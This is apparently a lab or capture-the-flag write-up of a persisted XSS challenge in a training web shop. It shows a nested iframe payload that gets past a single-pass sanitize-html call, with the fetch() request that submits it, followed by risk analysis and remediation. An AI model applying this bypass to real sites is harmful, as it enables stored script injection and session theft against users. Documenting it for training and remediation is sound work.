### **Methodology**

1. **Reconnaissance**
   - Identified the challenge as a persisted XSS attack requiring the payload `<iframe src="javascript:alert(`xss`)">` while bypassing a server-side sanitization mechanism. The target is the feedback/comment system.

2. **Source Code Analysis**
   - Checked the public GitHub repository for how the feedback comment field is processed.
   - Found in `models/feedback.ts` that the comment is sanitized server-side using `security.sanitizeHtml()` before being stored, and the challenge triggers only if the payload **survives** sanitization:
     ```js
     sanitizedComment = security.sanitizeHtml(comment)
     challengeUtils.solveIf(challenges.persistedXssFeedbackChallenge, () => {
       return utils.contains(sanitizedComment, '<iframe src="javascript:alert(`xss`)">')
     })
     ```

3. **Sanitizer Analysis**
   - Found in `lib/insecurity.ts` that `sanitizeHtml` wraps the `sanitize-html` library without recursive application:
     ```js
     export const sanitizeHtml = (html: string) => sanitizeHtmlLib(html)
     ```
   - Unlike `sanitizeSecure` (which applies sanitization recursively until the output stabilizes), `sanitizeHtml` only runs a single pass.
   - A carefully crafted nested payload can survive a single pass.

4. **Bypass Construction**
   - Crafted a double-nested payload where the outer malformed tag causes the sanitizer to remove only the wrapper, revealing the inner valid payload:
     ```
     <<iframe src="javascript:alert(`xss`)">iframe src="javascript:alert(`xss`)">
     ```
   - After one pass of `sanitize-html`, the outer `<` and its content are stripped, leaving the inner `<iframe src="javascript:alert(`xss`)">` intact.

5. **Captcha Retrieval**
   - Retrieved a valid captcha token before submitting the feedback:
     ```js
     const captcha = await fetch('/rest/captcha/', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
     }).then(r => r.json())
     ```

6. **Exploit**
   - Submitted the feedback with the bypass payload:
     ```js
     fetch('/api/Feedbacks', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + localStorage.getItem('token')
       },
       body: JSON.stringify({
         comment: '<<iframe src="javascript:alert(`xss`)">iframe src="javascript:alert(`xss`)">',
         rating: 5,
         captchaId: captcha.captchaId,
         captcha: captcha.answer
       })
     })
     ```

7. **Validation**
   - The server sanitized the outer wrapper but left the inner payload intact. The challenge was marked as solved.

8. **Tools Used**
   - **Browser DevTools** (console)
   - **GitHub Source Code Review** (to understand the sanitizer behavior)
   - **JavaScript `fetch` API** (for submitting the crafted feedback)

---
### **Vulnerabilities**

1. **Vulnerability Name**
   - **Stored/Persisted Cross-Site Scripting (XSS) via Non-Recursive Sanitization Bypass** (CWE-79)

2. **Affected Components**
   - **Feedback API Endpoint** (`POST /api/Feedbacks`), comment field, `sanitize-html` library used without recursive application

3. **Severity Level**
   - **High**
     - The non-recursive sanitizer can be bypassed with a double-nested payload, allowing malicious HTML to be stored and executed in the browser.
     - The payload persists in the database and executes for every user (including administrators) who views the feedback section.

---
### **Risks**

1. **Business Impact**
   - **Persistent Attack Surface**: The malicious payload is stored in the database and executed every time a user views the feedback section, maximizing its impact.
   - **Administrative Compromise**: If an admin views the feedback list, their privileged session can be hijacked, giving the attacker full control over the application.
   - **Session Hijacking**: Scripts injected via XSS can steal session tokens and cookies, leading to account takeover for any affected user.
   - **Reputational Damage**: A persistent XSS in a customer-facing feedback form is a severe trust violation, with potential legal consequences under GDPR.

2. **Exploitation Potential**
   - Any authenticated user can submit feedback, making this attack surface broadly accessible.
   - The bypass technique is well-documented and can be applied to any sanitizer that does not run recursively.

---
### **Actions**

#### **Risk Mitigation Strategies**
- Apply HTML sanitization **recursively** until the output stabilizes, similar to the `sanitizeSecure` function already present in the codebase.
- Use a strict allowlist approach — only permit a minimal set of safe HTML tags (e.g., `<b>`, `<i>`, `<br>`) if HTML formatting is needed, or strip all HTML entirely for plain text fields.
- Implement output encoding in addition to input sanitization when rendering user-supplied content.

#### **Remediation Fixes**
- Replace `security.sanitizeHtml(comment)` with `security.sanitizeSecure(comment)` in `models/feedback.ts` to apply recursive sanitization.
- If rich text is not needed in feedback comments, strip all HTML tags entirely using a plain-text sanitizer.
- Add a Content Security Policy (CSP) header that restricts script execution to trusted sources.

#### **Best Security Practices**
- Never assume a single-pass sanitizer is sufficient — always verify that the sanitizer handles nested and malformed HTML safely.
- Test sanitization logic specifically against nested and double-encoded payloads as part of security reviews.
- Combine input sanitization, output encoding, and CSP for defense in depth against XSS.
- **Reference**: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
